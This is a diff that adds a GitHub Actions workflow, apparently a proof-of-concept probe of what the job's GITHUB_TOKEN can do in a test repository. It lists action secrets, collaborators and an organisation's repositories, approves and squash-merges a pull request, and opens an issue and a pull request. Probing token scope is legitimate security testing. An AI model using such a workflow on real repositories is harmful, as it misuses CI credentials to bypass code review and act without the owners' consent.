@@ -1,0 +1,24 @@
+---
+name: cap-probe
+on:
+  workflow_dispatch:
+permissions:
+  pull-requests: write
+jobs:
+  cap:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          GH: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          R=PDFtoMark/gab-poc-postlint-e2e
+          call() { m="$1"; u="$2"; d="$3"; if [ -n "$d" ]; then out=$(curl -sS --max-time 20 -o /tmp/o -w '%{http_code}' -X "$m" -H "authorization: Bearer $GH" -H "accept: application/vnd.github+json" -H "content-type: application/json" "https://api.github.com$u" -d "$d"); else out=$(curl -sS --max-time 20 -o /tmp/o -w '%{http_code}' -X "$m" -H "authorization: Bearer $GH" -H "accept: application/vnd.github+json" "https://api.github.com$u"); fi; echo "CAP $m $u -> $out $(head -c 160 /tmp/o | tr '\n' ' ')"; }
+          call GET /repos/$R ''
+          call GET /repos/$R/actions/secrets ''
+          call GET /repos/$R/collaborators ''
+          call GET /orgs/AdobeDocs/repos ''
+          call POST /repos/$R/pulls/2/reviews '{"event":"APPROVE","body":"bot approval probe"}'
+          call PUT /repos/$R/pulls/2/merge '{"merge_method":"squash"}'
+          call POST /repos/$R/issues '{"title":"bot issue probe","body":"x"}'
+          call POST /repos/$R/pulls '{"title":"bot pr probe","head":"vec-pkg","base":"main"}'
+          call GET /repos/$R/issues/2/comments ''
